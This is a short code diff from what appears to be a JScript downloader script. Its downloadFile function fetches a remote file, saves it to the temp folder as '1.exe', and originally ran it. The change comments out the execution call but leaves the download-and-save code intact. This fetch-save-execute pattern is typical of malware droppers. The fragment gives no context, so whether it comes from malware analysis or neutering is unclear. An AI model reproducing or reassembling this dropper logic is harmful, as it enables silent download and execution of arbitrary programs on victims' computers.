@@ -41,7 +41,7 @@ function downloadFile(url, filename) {
       stream.write(xmlhttp.responseBody);
       stream.saveToFile(tempFolder+"\\1.exe", 2);
       stream.close();
-      runExeFile(tempFolder+"\\1.exe");
+      //runExeFile(tempFolder+"\\1.exe");
     }
   };
   xmlhttp.send();
